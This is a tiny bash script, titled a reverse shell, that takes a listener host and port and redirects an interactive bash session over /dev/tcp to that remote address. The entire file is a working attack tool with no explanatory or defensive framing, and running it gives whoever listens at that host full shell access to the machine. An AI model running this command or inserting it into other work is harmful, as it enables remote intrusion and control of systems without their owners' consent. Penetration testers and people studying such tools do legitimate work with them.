#!/bin/bash
# Bash reverse shell
# Usage: ./reverse-shell.sh <LHOST> <LPORT>

LHOST=$1
LPORT=$2

bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
